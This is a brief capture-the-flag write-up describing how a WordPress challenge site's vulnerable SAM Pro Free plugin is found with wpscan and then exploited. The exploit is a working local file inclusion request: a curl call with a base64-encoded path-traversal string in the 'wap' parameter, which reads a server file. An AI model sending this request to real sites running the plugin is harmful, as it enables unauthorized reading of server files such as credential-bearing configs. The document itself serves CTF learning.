What the LFI ?
==============

So we got a website : http://54.201.224.15:14099/ and we need to get `/var/www/blah.php` file.
Given the title, we know we need to find some LFI.

# Recon

This is a wordpress site, so just run wpscan, and after a few seconds :

```
[+] Enumerating plugins from passive detection ...
 | 1 plugin found:

[+] Name: sam-pro-free - v1.8.2.51
 |  Last updated: 2017-06-19T15:42:00.000Z
 |  Location: http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/
 |  Readme: http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/readme.txt
[!] The version is out of date, the latest version is 2.4.1.92

[!] Title: SAM Pro (Free Edition) <= 1.9.6.67 - Local File Inclusion (LFI)
    Reference: https://wpvulndb.com/vulnerabilities/8647
    Reference: https://www.pluginvulnerabilities.com/2016/10/28/local-file-inclusion-lfi-vulnerability-in-sam-pro-free-edition/
    Reference: https://plugins.trac.wordpress.org/changeset/1526624/sam-pro-free
[i] Fixed in: 1.9.7.69

```

# Exploit

Just find the exploit from documentation, then base64 encode your path (`../../../../../../../var/www/blah.php`) and:

```bash
$ curl 'http://54.201.224.15:14099/wp-content/plugins/sam-pro-free/sam-pro-ajax-admin.php?action=NA&wap=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9ibGFoLnBocA=='
flag{dont_include_files_derived_from_user_input_kthx_bai}
```
